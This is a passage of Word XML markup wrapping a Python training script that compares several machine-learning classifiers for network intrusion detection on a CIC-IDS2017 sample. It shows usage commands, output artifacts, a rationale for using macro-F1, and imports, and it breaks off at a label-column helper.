          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>用法：:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232EEC6A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37B8C1EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 五模型主对比</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58FEAF4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    python -m models.train --data data/cicids2017_sample.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BEFE7CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 只跑一两个模型，快速验证链路</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EC9FEE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    python -m models.train --data data/cicids2017_sample.csv --only xgboost hybrid_forest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B3AB3F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # DART 消融（残差相关，单列一节）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611756F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    python -m models.train --data data/cicids2017_sample.csv --dart-ablation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6457E6A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="676AE7D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>产物：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6C023B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    models/artifacts/best_model.pkl       最优模型 + scaler + 特征口径（一个包，推理侧只用它）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1C956E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    models/artifacts/feature_schema.json  特征列名/顺序、scaler 参数、类别表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA54B99">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    models/artifacts/comparison.json      五模型同口径指标明细</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1317E428">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29FD884F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>为什么选 macro-F1 而不是准确率：CIC-IDS2017 里 BENIGN 约占 80%，全判"正常"就有 80% 准确率。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F4D4559">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>macro-F1 对每一类同等加权，稀有类判错会直接掉分，才压得住这种退化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22779D43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ECF5BA7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CB67DF3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5172A447">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A73587D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D609B6D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="593C3E9E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218AC0CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E81860">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from datetime import datetime, timezone</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7DFFC3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE1FF0D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="247DC430">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import joblib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375C4EA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import numpy as np</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EBF8E55">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import pandas as pd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2153C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from sklearn.ensemble import RandomForestClassifier</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F29FDFC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from sklearn.linear_model import LogisticRegression</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14270497">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from sklearn.metrics import (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7F148E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    accuracy_score,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD93A43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    confusion_matrix,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5D1707">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    f1_score,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C0EE95">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    precision_recall_fscore_support,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9248C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56BFCF17">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from sklearn.model_selection import train_test_split</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100273EC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from sklearn.preprocessing import LabelEncoder, StandardScaler</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BA68048">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from sklearn.tree import DecisionTreeClassifier</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC27A42">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from xgboost import XGBClassifier</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD65AB4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F936E9E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127C85BF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from .hybrid_forest import HybridForest, count_trees</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D824CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from .labels import LABEL_MAP, normalize_label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5BFCFE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>except ImportError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2148BC55">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from hybrid_forest import HybridForest, count_trees</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD12080">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from labels import LABEL_MAP, normalize_label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E211BD9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E499812">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D5E4CA7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from settings import deep_merge, load_config  # noqa: F401  (deep_merge 供外部复用)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="189FB545">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>except ImportError:  # python models/train.py 时仓库根不在 sys.path 上</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7338A2BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sys.path.insert(0, str(Path(__file__).resolve().parent.parent))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D26CB91">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from settings import deep_merge, load_config  # noqa: F401</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4A50C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E28CF42">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>RARE_CLASS_SUPPORT = 30  # 测试集里样本数少于这个数的类，单类指标不可信</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B533F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30285F9E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44A7CC0F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ---------------------------------------------------------------- 配置与数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A9629B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="511651C5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62B19C38">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def find_label_column(df):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ADA2F83">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
